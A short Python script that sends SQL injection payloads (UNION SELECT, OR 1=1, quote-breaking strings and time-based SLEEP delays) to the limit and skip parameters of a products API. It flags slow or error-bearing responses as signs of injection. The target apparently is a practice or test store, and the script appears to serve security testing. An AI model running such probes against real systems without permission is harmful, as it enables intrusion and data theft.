import requests
import time

# Test products endpoint with limit/skip parameters for SQLi
url = "https://duck-store.escape.tech/api/v1/products"

# Test limit parameter
print("=== Testing limit parameter ===")
payloads = [
    "10",
    "10 UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
    "10 OR 1=1",
    "10' OR '1'='1",
    "10; SELECT SLEEP(5)--",
    "10 AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",
]

for payload in payloads:
    params = {"limit": payload, "skip": "0"}
    start = time.time()
    resp = requests.get(url, params=params)
    elapsed = time.time() - start
    print(f"limit={payload[:30]}... Status: {resp.status_code}, Time: {elapsed:.2f}s, Len: {len(resp.text)}")
    if elapsed > 4:
        print(f"  *** TIME-BASED SQLi DETECTED ***")
    if "sql" in resp.text.lower() or "syntax" in resp.text.lower() or "error" in resp.text.lower():
        print(f"  *** ERROR DETECTED ***")
        print(f"  Response: {resp.text[:200]}")

print("\n=== Testing skip parameter ===")
for payload in payloads:
    params = {"limit": "10", "skip": payload}
    start = time.time()
    resp = requests.get(url, params=params)
    elapsed = time.time() - start
    print(f"skip={payload[:30]}... Status: {resp.status_code}, Time: {elapsed:.2f}s, Len: {len(resp.text)}")
    if elapsed > 4:
        print(f"  *** TIME-BASED SQLi DETECTED ***")
    if "sql" in resp.text.lower() or "syntax" in resp.text.lower() or "error" in resp.text.lower():
        print(f"  *** ERROR DETECTED ***")
        print(f"  Response: {resp.text[:200]}")